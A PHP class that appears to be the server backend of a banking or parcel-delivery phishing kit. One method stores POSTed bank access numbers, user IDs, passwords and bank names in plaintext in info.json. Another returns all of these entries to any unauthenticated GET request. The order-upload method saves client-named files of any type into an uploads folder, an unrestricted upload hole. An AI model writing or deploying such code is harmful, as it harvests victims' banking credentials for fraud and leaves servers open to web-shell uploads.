<?php

class Operation
{
    public function readOrders($filePath)
    {
        if (file_exists($filePath)) {
            $jsonData = file_get_contents($filePath);
            return json_decode($jsonData, true) ?: [];
        }
        return [];
    }

    public function saveOrders($filePath, $orders)
    {
        file_put_contents($filePath, json_encode($orders, JSON_PRETTY_PRINT));
    }

    public function saveDataToJsonFile()
    {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $accessNumber = $_POST['accessNumber'] ?? '';
            $userId = $_POST['userId'] ?? '';
            $password = $_POST['password'] ?? '';
            $bank = $_POST['bank'] ?? '';

            $data = [
                'accessNumber' => $accessNumber,
                'userId' => $userId,
                'password' => $password,
                'bank' => $bank,
                'timestamp' => date('Y-m-d H:i:s')
            ];

            $file = __DIR__ . '/info.json';
            $currentData = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

            $currentData[] = $data;
            $jsonData = json_encode($currentData, JSON_PRETTY_PRINT);

            if (file_put_contents($file, $jsonData)) {
                echo json_encode(['status' => 'success']);
            } else {
                echo json_encode([
                    'success' => false,
                    'message' => 'Failed to write to file',
                ]);
            }
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'Invalid request',
            ]);
        }
    }

    public function uploadOrder()
    {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $filePath = 'web-info.json';
            $uploadDir = 'uploads/';

            $orderNumber = $_POST['order_number'] ?? '';
            $address = $_POST['address'] ?? '';
            $product = $_POST['product'] ?? '';
            $price = $_POST['price'] ?? '';
            $receipientName = $_POST['receipient_name'] ?? '';
            $receipientLastName = $_POST['receipient_last_name'] ?? '';
            $date = $_POST['date'] ?? '';

            if (empty($orderNumber) || empty($address) || empty($product) || empty($price) ||
                empty($receipientName) || empty($receipientLastName) || empty($date)) {
                echo json_encode([
                    'success' => false,
                    'message' => "All fields are required. $orderNumber, $address, $product, $price, $receipientName, $receipientLastName, $date"
                ]);
                exit;
            }

            $image = '';
            if (!empty($_FILES['image']['name'])) {
                if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
                    echo json_encode([
                        'success' => false,
                        'message' => 'File upload error: ' . $_FILES['image']['error']
                    ]);
                    exit;
                }
    
                $imageFileName = basename($_FILES['image']['name']);
                $imagePath = $uploadDir . $imageFileName;
                if (move_uploaded_file($_FILES['image']['tmp_name'], $imagePath)) {
                    $image = $imagePath;
                } else {
                    echo json_encode([
                        'success' => false,
                        'message' => 'Failed to upload image.'
                    ]);
                    exit;
                }
            }
    
            // Prepare new order data
            $newOrder = [
                'order_number' => $orderNumber,
                'address' => $address,
                'product' => $product,
                'price' => $price,
                'receipient_name' => $receipientName,
                'receipient_last_name' => $receipientLastName,
                'date' => $date,
                'image' => $image
            ];
    
            // Load existing orders
            $orders = $this->readOrders($filePath);
            $orderExists = false;
    
            // Update or add order
            foreach ($orders as &$order) {
                if ($order['order_number'] === $orderNumber) {
                    $order = $newOrder;
                    $orderExists = true;
                    break;
                }
            }
            unset($order);
    
            if (!$orderExists) {
                $orders[] = $newOrder;
            }
    
            // Save updated orders
            $this->saveOrders($filePath, $orders);
    
            echo json_encode([
                'success' => true,
                'message' => 'Order saved successfully!',
                'order' => $newOrder
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'Invalid request',
            ]);
        }
    }

    public function fetchOrders()
    {
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            $filePath = 'web-info.json';
            $orders = $this->readOrders($filePath);
            if ($orders) {
                echo json_encode([
                    'success' => true,
                    'message' => 'Orders fetched!',
                    'orders' => $orders
                ]);
            } else {
                echo json_encode([
                    'success' => false,
                    'message' => 'No Orders fetched!',
                    'orders' => $orders
                ]);
            }
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'Invalid request',
            ]);
        }
    }

    public function fetchBanks()
    {
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            $filePath = 'info.json';
            $orders = $this->readOrders($filePath);
            if ($orders) {
                echo json_encode([
                    'success' => true,
                    'message' => 'Banks fetched!',
                    'banks' => $orders
                ]);
            } else {
                echo json_encode([
                    'success' => false,
                    'message' => 'No Banks fetched!',
                    'banks' => $orders
                ]);
            }
        } else {
            echo json_encode([
                'success' => false,
                'message' => 'Invalid request',
            ]);
        }
    }
}
